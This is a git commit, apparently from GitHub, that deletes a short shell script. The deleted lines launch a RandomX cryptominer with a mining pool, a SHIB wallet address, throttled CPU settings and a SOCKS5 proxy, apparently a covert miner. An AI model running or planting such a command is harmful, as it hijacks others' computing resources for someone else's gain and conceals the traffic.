4894ddbaf36ad3c40a16739de1524784bdd0b0a0
JohnPHanna <88381331+JohnPHanna@users.noreply.github.com>
2021-08-03 19:32:06 +0700

    Delete ucu.sh

--- ucu.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/sh
-chmod +x ucu
-./ucu --disable-gpu --algorithm randomx --pool stratum+tcp://rx.unmineable.com:13333 --wallet SHIB:0xc47ac4f4bb1e94f545738b2b8043bdfd711deaeb --worker MEGALOMAN --disable-msr-tweaks --keepalive value true --cpu-threads 2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455
